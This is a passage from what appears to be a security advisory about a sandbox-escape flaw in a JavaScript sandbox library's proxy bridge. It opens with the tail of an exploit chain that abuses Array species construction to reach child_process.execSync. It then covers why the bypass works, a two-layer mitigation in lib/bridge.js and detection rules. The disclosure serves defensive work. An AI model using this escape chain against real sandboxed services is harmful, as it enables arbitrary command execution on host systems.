const d = cwu(a, g, [ho.freeze, ['__proto__']]);
const e = cwu(a, d[0], [ho.entries({}), ['call']]);
const c = cwu(a, a, [e[0]]);
a.apply(a, e)().mainModule.require('child_process').execSync('...');
```

### Why It Works

The bridge wraps every value crossing the boundary in proxies, but `ArraySpeciesCreate` is a V8 internal algorithm that operates entirely within the host realm. When the species constructor returns the same array, `map`'s internal `CreateDataPropertyOrThrow` stores results directly on that array -- no bridge crossing occurs. The values stay on the host side, completely bypassing proxy sanitization.

The `Object.assign` bypass is particularly insidious: the sandbox proxy's `set` trap only intercepts writes initiated from the sandbox side. `Object.assign` runs as a host-side function (through the `apply` trap), and its internal `[[Set]]` operations target the underlying host array directly.

### Mitigation

Two-layer defense in `lib/bridge.js`:

1. **Proxy `get` trap — cached `Array` ctor for host arrays**: When sandbox code reads `.constructor` on a host-array-backed proxy, the trap returns a module-load-time-captured `thisArrayCtor = Array` reference. This bypass of the normal property read neutralises any attacker-installed `constructor` (direct `r.constructor = x`, `Object.defineProperty`, `Object.assign`, prototype-chain injection via `Object.setPrototypeOf`) and is immune to prototype pollution of `Array.prototype.constructor`. Only defends sandbox-side reads; does not cover V8-internal reads issued from the host realm.
2. **Apply/construct trap neutralize-and-restore**: Before every `otherReflectApply(object, context, args)` and `otherReflectConstruct(object, args)` — i.e. every sandbox→host function invocation — the bridge walks `context` and each top-level argument. For every host array found (`Array.isArray` is cross-realm safe), it installs `constructor = undefined` as a data own property (shadowing both own and inherited constructors; the ES2024 spec explicitly maps `constructor === undefined` to `%Array%` in ArraySpeciesCreate). After the host call returns — in a `finally` — the prior descriptor is restored (or the shadow deleted if none existed). This covers V8-internal reads issued from the host realm during the call.

Both layers reject un-neutralisable arrays with `VMError`: a pre-installed non-configurable `constructor` whose value is anything other than `undefined`, or a non-extensible array without an own `constructor` slot, cannot be safely shadowed or restored and is treated as an attack.

The neutralize-on-entry/restore-on-exit pattern mirrors `resetPromiseSpecies` in `setup-sandbox.js`, which closes the equivalent V8-internal-bypass class for Promise.

### Detection Rules

- **`r.constructor = x` where `x` has `Symbol.species`** -- species self-return pattern.
- **`x[Symbol.species] = x`** -- self-referential species.
- **`function x() { return r; }` as species** -- constructor returning existing object.
- **`ho.assign(r, {constructor: ...})`** -- bypassing proxy set trap via host Object.assign.
- **`.map(f)` on arrays with custom constructor** -- triggering ArraySpeciesCreate.
- **`ho.entries({})` or `Object.entries()`** -- creating host arrays for species manipulation.
